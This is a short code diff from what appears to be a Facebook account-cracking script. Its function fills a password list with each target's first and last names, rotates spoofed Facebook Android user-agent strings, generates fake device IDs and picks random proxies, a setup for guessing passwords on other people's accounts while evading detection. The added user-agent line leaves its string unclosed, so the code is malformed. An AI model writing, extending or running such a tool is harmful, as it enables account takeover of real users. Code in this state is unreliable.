@@ -483,7 +483,8 @@ def M_file_1(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                u1a = "[FBAN/FB4A;FBAV/162.0.0.45.94;FBBV/95632808;FBDM/{density=1.25,width=1297,height=2329};FBLC/en_US;FBRV/95794877;FB_FW/2;FBCR/TracFone Wireless;FBMF/Lava;FBBD/lava;FBPN/com.facebook.katana;FBDV/A125;FBSV/10.8.5;FBOP/20;FBCA/arm64-v8a:armeabi-v7a:armeabi;]"
+                                u1a = "[FBAN/FB4A;FBAV/461.0.0.0.73;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/451208771;FBCR/Vodafone Red;FBMF/Realme;FBBD/realme;FBDV/RMX3718;FBSV/14.6.1;FBCA/arm64-v8a:null;FBDM/{density=2.5,width=1060,height=1288};FB_FW/1;FBRV/451669864;][FBAN/FB4A;FBAV/89.0.0.17.70;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/35810399;FBCR/Chatr Mobile;FBMF/LG;FBBD/lg;FBDV/LGD380;FBSV/5.7.2;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=1.5,width=825,height=2280};FB_FW/1;]
+
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
